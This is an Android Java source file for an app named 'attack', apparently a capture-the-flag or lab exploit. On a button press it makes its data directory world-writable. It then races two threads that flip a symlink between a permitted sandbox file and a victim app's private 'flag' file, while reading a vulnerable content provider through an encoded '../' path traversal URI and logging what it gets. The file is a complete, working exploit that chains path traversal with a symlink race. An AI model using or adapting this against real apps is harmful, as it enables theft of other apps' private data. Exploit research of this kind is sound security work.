package com.example.attack;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {
    final static String TAG = "attackApp";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        Button attackBtn = findViewById(R.id.attackBtn);

        attackBtn.setOnClickListener(v -> {

            String root = getApplicationInfo().dataDir;
            String symlink = root + "/symlink";
            Log.i(TAG, "root : " + root);

            try{
                Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
            }catch (InterruptedException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            String path = "content://vulprovider/test/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" + "data%2Fdata%2Fcom.example.attack%2Fsymlink";
            new Thread(() -> {
                while (true){
                    try{
                        Runtime.getRuntime().exec("ln -sf /storage/emulated/0/Android/data/com.example.victim/files/sandbox/file1 " + symlink).waitFor();
                    }catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();

            new Thread(() -> {
                while (true){
                    try{
                        Runtime.getRuntime().exec("ln -sf /data/data/com.example.victim/files/flag " + symlink).waitFor();
                    }catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();

            while (true){
                try {
                    String data = readUri(Uri.parse(path));
                    if (data != null)
                    {
                        Log.i("flag content: ", data);
                    }
                } catch (Exception e) {
                    Log.e(TAG, e.getMessage());
                }
            }

        });

    }

    private String readUri(Uri uri) {
        InputStream inputStream = null;
        try {
            ContentResolver contentResolver = getContentResolver();
            inputStream = contentResolver.openInputStream(uri);
            if (inputStream != null) {
                byte[] buffer = new byte[1024];
                int result;
                String content = "";
                while ((result = inputStream.read(buffer)) != -1) {
                    content = content.concat(new String(buffer, 0, result));
                }
                return content;
            }
        } catch (IOException e) {
            Log.e("receiver", "IOException when reading uri", e);
        } catch (IllegalArgumentException e) {
            //Log.e("receiver", "IllegalArgumentException", e);
        } finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                } catch (IOException e) {
                    Log.e("receiver", "IOException when closing stream", e);
                }
            }
        }
        return null;
    }

}